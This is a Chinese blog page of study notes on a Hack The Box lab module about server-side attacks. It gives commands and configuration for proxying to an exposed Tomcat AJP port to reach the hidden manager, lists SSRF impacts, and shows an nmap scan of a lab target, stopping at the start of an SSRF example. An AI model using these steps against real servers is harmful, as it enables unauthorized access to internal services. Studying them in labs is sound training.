<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ServersideAttacksHTB | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Introduction to Server-Side Attacks服务器端攻击的目标是服务器提供的应用程序或服务，而客户端攻击的目的是攻击客户端。理解和识别这些差异对于渗透测试和bug赏金猎人来说是至关重要的。 一个很好的例子，应该有助于澄清服务器端攻击与客户端攻击之间的差异是Cross-Site Request Forgeries (CSRF)和Server-side Request For">
<meta property="og:type" content="article">
<meta property="og:title" content="ServersideAttacksHTB">
<meta property="og:url" content="http://mikannse.space/2023/10/30/ServersideAttacksHTB/index.html">
<meta property="og:site_name" content="MikannseのSekai">
<meta property="og:description" content="Introduction to Server-Side Attacks服务器端攻击的目标是服务器提供的应用程序或服务，而客户端攻击的目的是攻击客户端。理解和识别这些差异对于渗透测试和bug赏金猎人来说是至关重要的。 一个很好的例子，应该有助于澄清服务器端攻击与客户端攻击之间的差异是Cross-Site Request Forgeries (CSRF)和Server-side Request For">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
<meta property="article:published_time" content="2023-10-30T14:34:41.000Z">
<meta property="article:modified_time" content="2024-09-04T08:50:15.966Z">
<meta property="article:author" content="Mikannse">
<meta property="article:tag" content="网安">
<meta property="article:tag" content="笔记">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="SSTI">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2023/10/30/ServersideAttacksHTB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ServersideAttacksHTB',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2024-09-04 16:50:15'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (true) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">308</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ServersideAttacksHTB</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-30T14:34:41.000Z" title="发表于 2023-10-30 22:34:41">2023-10-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-04T08:50:15.966Z" title="更新于 2024-09-04 16:50:15">2024-09-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">28.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>146分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ServersideAttacksHTB"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Introduction-to-Server-Side-Attacks"><a href="#Introduction-to-Server-Side-Attacks" class="headerlink" title="Introduction to Server-Side Attacks"></a>Introduction to Server-Side Attacks</h1><p>服务器端攻击的目标是服务器提供的应用程序或服务，而客户端攻击的目的是攻击客户端。理解和识别这些差异对于渗透测试和bug赏金猎人来说是至关重要的。</p>
<p>一个很好的例子，应该有助于澄清服务器端攻击与客户端攻击之间的差异是<code>Cross-Site Request Forgeries (CSRF)</code>和<code>Server-side Request Forgeries (SSRF)</code>。这两种攻击都涉及Web服务器以及服务器如何处理URL。然而，CSRF和SSRF有不同的目标和目的。</p>
<p>大致引用自<a target="_blank" rel="noopener" href="https://academy.hackthebox.com/course/preview/introduction-to-web-applications">Web应用程序简介</a>模块中的跨站点请求伪造部分：</p>
<p> CSRF攻击可能利用其他客户端攻击（如XSS漏洞）向受害者已通过身份验证的Web应用程序执行请求。这允许攻击者以授权用户的身份执行操作，例如将其密码更改为攻击者可能知道的内容，或者以受害者的身份执行任何未经授权的操作。 </p>
<p>从上述情况，我们应该可以推断出目标是客户。服务器端攻击的目标是实际的应用程序，目标是泄漏敏感数据或将未经授权的输入注入应用程序，甚至实现远程代码执行（RCE）。这种情况下的目标是后端服务。</p>
<h2 id="Types-of-Server-Side-Attacks"><a href="#Types-of-Server-Side-Attacks" class="headerlink" title="Types of Server-Side Attacks"></a>Types of Server-Side Attacks</h2><p>本模块将介绍不同类型的服务器端攻击以及如何利用它们。这些措施是：</p>
<ul>
<li><code>Abusing Intermediary Applications</code>：通过利用特定的公开二进制协议，防止内部应用程序无法从我们的网络访问。</li>
<li><code>Server-Side Request Forgery (SSRF)</code>：使宿主应用程序服务器向任意外部域或内部资源发出请求，以尝试识别敏感数据。</li>
<li><code>Server-Side Includes Injection (SSI)</code>：注入一个有效载荷，以便恶意的服务器端包含指令被解析，以实现远程代码执行或泄漏敏感数据。当未经充分验证的用户输入设法成为为服务器端Include指令分析的响应的一部分时，就会发生此漏洞。</li>
<li><code>Edge-Side Includes Injection (ESI)</code>：ESI是一种基于XML的标记语言，用于通过临时存储常规Web缓存协议无法保存的动态Web内容来解决性能问题。当攻击者设法在HTTP响应中反映恶意的ESI标记时，就会发生边缘侧包含注入。此漏洞的根本原因是HTTP代理无法验证ESI标记来源。他们将很乐意解析和评估上游服务器提供的合法ESI标记以及攻击者提供的恶意ESI标记。</li>
<li><code>Server-Side Template Injection (SSTI)</code>：模板引擎通过网页或电子邮件促进动态数据呈现。服务器端模板注入本质上是在模板中注入恶意的模板指令（有效负载），利用模板引擎将用户输入与给定模板不安全地混合在一起。</li>
<li><code>Extensible Stylesheet Language Transformations Server-Side Injection (XSLT)</code>：XML是一种基于XML的语言，通常用于将XML文档转换为HTML、另一个XML文档或PDF。可扩展样式表语言转换服务器端注入可能发生在可以上载任意XSL文件或应用程序使用来自用户的未经验证的输入动态生成XSL转换的XML文档时。</li>
</ul>
<h1 id="Abusing-Intermediary-Applications"><a href="#Abusing-Intermediary-Applications" class="headerlink" title="Abusing Intermediary Applications"></a>Abusing Intermediary Applications</h1><h2 id="Nginx-Reverse-Proxy-amp-AJP"><a href="#Nginx-Reverse-Proxy-amp-AJP" class="headerlink" title="Nginx Reverse Proxy &amp; AJP"></a>Nginx Reverse Proxy &amp; AJP</h2><p>当我们遇到一个开放的AJP代理端口（8009 TCP）时，我们可以使用Nginx和<code>ajp_module</code>来访问“隐藏的”Tomcat管理器。这可以通过编译Nginx源代码并添加所需的模块来完成，如下所示：</p>
<ul>
<li>下载Nginx源代码</li>
<li>下载所需模块</li>
<li>使用<code>ajp_module</code>编译Nginx源代码。</li>
<li>创建指向AJP端口的配置文件</li>
</ul>
<h4 id="下载Nginx源码"><a href="#下载Nginx源码" class="headerlink" title="下载Nginx源码"></a>下载Nginx源码</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ wget https://nginx.org/download/nginx-1.21.3.tar.gz</span><br><span class="line">mikannse7@htb[/htb]$ tar -xzvf nginx-1.21.3.tar.gz</span><br></pre></td></tr></tbody></table></figure>

<h4 id="使用ajp模块编译Nginx源代码"><a href="#使用ajp模块编译Nginx源代码" class="headerlink" title="使用ajp模块编译Nginx源代码"></a>使用ajp模块编译Nginx源代码</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ git clone https://github.com/dvershinin/nginx_ajp_module.git</span><br><span class="line">mikannse7@htb[/htb]$ cd nginx-1.21.3</span><br><span class="line">mikannse7@htb[/htb]$ sudo apt install libpcre3-dev</span><br><span class="line">mikannse7@htb[/htb]$ ./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules</span><br><span class="line">mikannse7@htb[/htb]$ make</span><br><span class="line">mikannse7@htb[/htb]$ sudo make install</span><br><span class="line">mikannse7@htb[/htb]$ nginx -V</span><br><span class="line"></span><br><span class="line">nginx version: nginx/1.21.3</span><br><span class="line">built by gcc 10.2.1 20210110 (Debian 10.2.1-6)</span><br><span class="line">configure arguments: --add-module=../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules</span><br></pre></td></tr></tbody></table></figure>

<p><strong>注意：</strong>在下面的配置中，我们使用端口8009，这是Tomcat的AJP默认端口，这是我们在真实的环境中使用它的方式。但是，要完成本节末尾的练习，您应该指定要生成的目标的IP和端口（它们都将在“Target：“旁边可见）。您将看到的端口实际上映射到底层Docker容器的端口8009。</p>
<p>注释掉整个<code>server</code>块，并将以下行附加到<code>http</code>中的<code>/etc/nginx/conf/nginx.conf</code>块中。</p>
<h4 id="指向AJP端口"><a href="#指向AJP端口" class="headerlink" title="指向AJP端口"></a>指向AJP端口</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">upstream tomcats {</span><br><span class="line">	server &lt;TARGET_SERVER&gt;:8009;</span><br><span class="line">	keepalive 10;</span><br><span class="line">	}</span><br><span class="line">server {</span><br><span class="line">	listen 80;</span><br><span class="line">	location / {</span><br><span class="line">		ajp_keep_conn on;</span><br><span class="line">		ajp_pass tomcats;</span><br><span class="line">	}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><strong>注意：</strong>如果您使用的是Pwnbox，那么端口80将已经在使用中，因此，在上述配置中将端口80更改为8080。最后，在下一步中，使用端口8080和cURL。</p>
<p>启动Nginx并通过向本地主机发出cURL请求来检查是否一切正常。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo nginx</span><br><span class="line">mikannse7@htb[/htb]$ curl http://127.0.0.1:80</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset="UTF-8" /&gt;</span><br><span class="line">        &lt;title&gt;Apache Tomcat/X.X.XX&lt;/title&gt;</span><br><span class="line">        &lt;link href="favicon.ico" rel="icon" type="image/x-icon" /&gt;</span><br><span class="line">        &lt;link href="favicon.ico" rel="shortcut icon" type="image/x-icon" /&gt;</span><br><span class="line">        &lt;link href="tomcat.css" rel="stylesheet" type="text/css" /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div id="wrapper"&gt;</span><br><span class="line">            &lt;div id="navigation" class="curved container"&gt;</span><br><span class="line">                &lt;span id="nav-home"&gt;&lt;a href="https://tomcat.apache.org/"&gt;Home&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-hosts"&gt;&lt;a href="/docs/"&gt;Documentation&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-config"&gt;&lt;a href="/docs/config/"&gt;Configuration&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-examples"&gt;&lt;a href="/examples/"&gt;Examples&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-wiki"&gt;&lt;a href="https://wiki.apache.org/tomcat/FrontPage"&gt;Wiki&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-lists"&gt;&lt;a href="https://tomcat.apache.org/lists.html"&gt;Mailing Lists&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-help"&gt;&lt;a href="https://tomcat.apache.org/findhelp.html"&gt;Find Help&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;br class="separator" /&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id="asf-box"&gt;</span><br><span class="line">                &lt;h1&gt;Apache Tomcat/X.X.XX&lt;/h1&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id="upper" class="curved container"&gt;</span><br><span class="line">                &lt;div id="congrats" class="curved container"&gt;</span><br><span class="line">                    &lt;h2&gt;If you're seeing this, you've successfully installed Tomcat. Congratulations!&lt;/h2&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>幸运的是，Apache为我们预编译了AJP模块。我们将需要安装它，虽然，因为它不来在默认安装。在我们的Apache服务器中配置AJP-Proxy可以如下完成：</p>
<ul>
<li>安装libapache 2-mod-jk包</li>
<li>使得模块</li>
<li>创建指向目标AJP-Proxy端口的配置文件</li>
</ul>
<p><strong>注意：</strong>如前所述，Pwnbox使用的是80端口，Apache也将其用作默认端口。你可以在“/etc/apache 2/ports.conf”中将Apache的默认端口更改为任何其他端口。如果你使用8080端口，别忘了提前用<code>sudo nginx -s  stop</code>停止nginx。在下面的配置中，我们使用的是8009，这是Tomcat的默认AJP端口，这是我们在真实的环境中使用它的方式。但是，要完成上一节末尾的练习，这次使用Apache，您应该指定要生成的目标的IP和端口（它们都将在“Target：“旁边可见）。您将看到的端口实际上映射到底层Docker容器的端口8009。</p>
<p>所需的命令和配置文件如下：                                                             </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo apt install libapache2-mod-jk</span><br><span class="line">mikannse7@htb[/htb]$ sudo a2enmod proxy_ajp</span><br><span class="line">mikannse7@htb[/htb]$ sudo a2enmod proxy_http</span><br><span class="line">mikannse7@htb[/htb]$ export TARGET="&lt;TARGET_IP&gt;"</span><br><span class="line">mikannse7@htb[/htb]$ echo -n """&lt;Proxy *&gt;</span><br><span class="line">Order allow,deny</span><br><span class="line">Allow from all</span><br><span class="line">&lt;/Proxy&gt;</span><br><span class="line">ProxyPass / ajp://$TARGET:8009/</span><br><span class="line">ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf</span><br><span class="line">mikannse7@htb[/htb]$ sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf</span><br><span class="line">mikannse7@htb[/htb]$ sudo systemctl start apache2</span><br></pre></td></tr></tbody></table></figure>

<p><strong>注意：</strong>下面的cURL命令是您通常使用的命令，因为Apache默认侦听端口80。请记住，您必须将端口80更改为您选择的另一个端口。因此，为了完成上一节的练习，下一步是在使用cURL时指定您选择的端口，例如“curl <a href="http://127.0.0.1:8080“。">http://127.0.0.1:8080“。</a></p>
<h4 id="Accessing-the-“hidden”-Tomcat-page"><a href="#Accessing-the-“hidden”-Tomcat-page" class="headerlink" title="Accessing the “hidden” Tomcat page"></a>Accessing the “hidden” Tomcat page</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl http://127.0.0.1</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset="UTF-8" /&gt;</span><br><span class="line">        &lt;title&gt;Apache Tomcat/X.X.XX&lt;/title&gt;</span><br><span class="line">        &lt;link href="favicon.ico" rel="icon" type="image/x-icon" /&gt;</span><br><span class="line">        &lt;link href="favicon.ico" rel="shortcut icon" type="image/x-icon" /&gt;</span><br><span class="line">        &lt;link href="tomcat.css" rel="stylesheet" type="text/css" /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div id="wrapper"&gt;</span><br><span class="line">            &lt;div id="navigation" class="curved container"&gt;</span><br><span class="line">                &lt;span id="nav-home"&gt;&lt;a href="https://tomcat.apache.org/"&gt;Home&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-hosts"&gt;&lt;a href="/docs/"&gt;Documentation&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-config"&gt;&lt;a href="/docs/config/"&gt;Configuration&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-examples"&gt;&lt;a href="/examples/"&gt;Examples&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-wiki"&gt;&lt;a href="https://wiki.apache.org/tomcat/FrontPage"&gt;Wiki&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-lists"&gt;&lt;a href="https://tomcat.apache.org/lists.html"&gt;Mailing Lists&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-help"&gt;&lt;a href="https://tomcat.apache.org/findhelp.html"&gt;Find Help&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;br class="separator" /&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id="asf-box"&gt;</span><br><span class="line">                &lt;h1&gt;Apache Tomcat/X.X.XX&lt;/h1&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id="upper" class="curved container"&gt;</span><br><span class="line">                &lt;div id="congrats" class="curved container"&gt;</span><br><span class="line">                    &lt;h2&gt;If you're seeing this, you've successfully installed Tomcat. Congratulations!&lt;/h2&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>如果我们正确配置了所有内容，我们将能够使用cURL和Web浏览器访问Apache Tomcat管理器。</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/tomcat.png" alt="image"></p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>服务器端请求伪造（<code>SSRF</code>）攻击，列在OWASP前10名中，允许我们滥用服务器功能来代表服务器执行内部或外部资源请求。为此，我们通常需要提供或修改目标应用程序用来读取或提交数据的URL。利用SSRF漏洞可能导致：</p>
<ul>
<li>与已知内部系统交互</li>
<li>通过端口扫描发现内部服务</li>
<li>泄露本地/敏感数据</li>
<li>在目标应用程序中包括文件</li>
<li>使用路径泄漏NetNTLM哈希（Windows）</li>
<li>实现远程代码执行</li>
</ul>
<p>我们通常可以在获取远程资源的应用程序中找到SSRF漏洞。在寻找SSRF漏洞时，我们应该寻找：</p>
<ul>
<li>请求的一部分，包括URL</li>
<li>文件导入，如HTML、PDF、图像等。</li>
<li>远程服务器连接以获取数据</li>
<li>API规范导入</li>
<li>仪表板，包括ping和类似功能，用于检查服务器状态</li>
</ul>
<p><strong>注意：</strong>请始终记住，Web应用程序模糊测试应该是任何渗透测试或bug赏金狩猎活动的一部分。也就是说，模糊不应该仅限于用户输入字段。将模糊处理扩展到HTTP请求的各个部分，比如User-Agent。</p>
<h2 id="SSRF-Exploitation-Example"><a href="#SSRF-Exploitation-Example" class="headerlink" title="SSRF Exploitation Example"></a>SSRF Exploitation Example</h2><p>让我们首先利用一个面向互联网的Web应用程序（目标可以在本节底部生成），然后通过链接多个SSRF漏洞来在内部主机上获得远程代码执行。攻击流程如下：</p>
<table>
<thead>
<tr>
<th><code>[PENTESTER]</code></th>
<th><code>🠖</code></th>
<th><code>[EXERCISE-TARGET]--[SSRF]</code></th>
<th><code>🠖</code></th>
<th><code>[INTERNAL-WEBSERVER]--[SSRF]</code></th>
<th><code>🠖</code></th>
<th><code>[LOCALHOST WEBAPP]</code></th>
<th><code>🠖</code></th>
<th><code>[RCE]</code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>导航到本节的结尾并单击<code>Click here to spawn the target system!</code>，然后使用提供的Pwnbox或具有提供的VPN密钥的本地VM来沿着。</p>
<p>对主机的基本侦察显示只有三个开放端口。</p>
<h4 id="Nmap-Discovering-Open-Ports-Nmap"><a href="#Nmap-Discovering-Open-Ports-Nmap" class="headerlink" title="Nmap - Discovering Open Ports Nmap"></a>Nmap - Discovering Open Ports Nmap</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ nmap -sT -T5 --min-rate=10000 -p- &lt;TARGET IP&gt;</span><br><span class="line"></span><br><span class="line">Nmap scan report for &lt;TARGET IP&gt;</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line">22/tcp  open   ssh</span><br><span class="line">80/tcp  open   http</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds</span><br></pre></td></tr></tbody></table></figure>

<p>让我们向目标服务器发出一个cURLrequest，使用参数<code>-i</code>显示协议响应头，使用参数<code>-s</code>使用静默模式。</p>
